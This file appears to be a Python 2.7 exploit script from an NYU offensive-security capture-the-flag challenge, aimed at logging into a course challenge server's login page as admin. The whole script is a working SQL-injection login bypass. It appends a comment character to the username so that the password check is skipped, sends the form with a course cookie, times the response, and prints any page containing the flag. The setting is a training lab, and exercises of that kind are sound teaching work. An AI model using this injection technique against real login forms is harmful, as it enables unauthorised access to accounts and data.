#!/usr/bin/python2.7
# Objective: log into http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php? as admin

import requests
import time
import math

'''
From experimentation, I found that the login script (PHP) posts the email and password 
to /login.php? as an application/x-www-form-urlencoded form. I replicate this here.
'''

username = raw_input("Username: ")
password = raw_input("Password: ")

username += " #"

'''

'''

login = { "email": username, "password": password } #password does not really matter
url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php?"
cookies = dict(CHALBROKER_USER_ID='tk1931') # for admin purposes

start = time.time()
r = requests.post(url, data=login, cookies=cookies)
end = time.time()
length = end - start
print("Response Time: " + str(end-start))

if "No such user" in r.text or r.status_code == 500 : # If it causes a server error or returns back the unsuccessful login
    print("Query Failure")
elif "flag" in r.text: # If the successful login screen is shown
    print(r.text)
else :
    print(r.text)